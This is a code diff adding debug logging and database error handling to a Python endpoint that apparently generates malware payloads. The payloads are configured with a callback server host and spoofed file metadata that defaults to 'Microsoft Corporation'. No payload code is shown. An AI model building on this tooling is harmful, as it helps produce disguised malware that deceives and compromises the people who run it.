@@ -281,6 +281,7 @@ async def generate_payload(payload_config: dict):
         payload_id = str(uuid.uuid4())
         print(f"✅ [DEBUG] ID généré: {payload_id}")
         
+        print("⚙️ [DEBUG] Configuration du payload...")
         # Configuration du payload
         config = {
             'server_host': payload_config['host'],
@@ -299,10 +300,15 @@ async def generate_payload(payload_config: dict):
             'company': payload_config.get('company', 'Microsoft Corporation'),
             'version': payload_config.get('version', '1.0.0.0')
         }
+        print(f"✅ [DEBUG] Configuration créée: {json.dumps(config, indent=2)}")
         
+        print("📝 [DEBUG] Génération du code source...")
         # Générer le code source du payload
         payload_source = generate_payload_source(config)
+        print(f"✅ [DEBUG] Code source généré: {len(payload_source)} caractères")
+        print(f"📄 [DEBUG] Extrait du code: {payload_source[:200]}...")
         
+        print("💾 [DEBUG] Sauvegarde en base de données...")
         # Sauvegarder les informations du payload en base
         payload_doc = {
             "_id": payload_id,
@@ -314,8 +320,14 @@ async def generate_payload(payload_config: dict):
             "status": "generated"
         }
         
-        db.payloads.insert_one(payload_doc)
+        try:
+            db.payloads.insert_one(payload_doc)
+            print("✅ [DEBUG] Payload sauvegardé en base avec succès")
+        except Exception as db_error:
+            print(f"❌ [DEBUG] Erreur base de données: {str(db_error)}")
+            raise HTTPException(status_code=500, detail=f"Erreur base de données: {str(db_error)}")
         
+        print("📊 [DEBUG] Création de l'activité...")
         # Logger l'activité
         activity = {
             "_id": str(uuid.uuid4()),
@@ -332,14 +344,26 @@ async def generate_payload(payload_config: dict):
             },
             "timestamp": datetime.utcnow()
         }
-        db.activities.insert_one(activity)
         
-        return {
+        try:
+            db.activities.insert_one(activity)
+            print("✅ [DEBUG] Activité enregistrée avec succès")
+        except Exception as activity_error:
+            print(f"⚠️ [DEBUG] Erreur enregistrement activité: {str(activity_error)}")
+        
+        print("🎉 [DEBUG] Préparation de la réponse...")
+        response_data = {
             "success": True,
             "payload_id": payload_id,
             "filename": config['install_name'],
             "message": "Payload généré avec succès"
         }
+        print(f"📤 [DEBUG] Réponse à envoyer: {json.dumps(response_data, indent=2)}")
+        print("=" * 80)
+        print("✅ [DEBUG] FIN GÉNÉRATION PAYLOAD - SUCCÈS")
+        print("=" * 80)
+        
+        return response_data
         
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Erreur lors de la génération: {str(e)}")
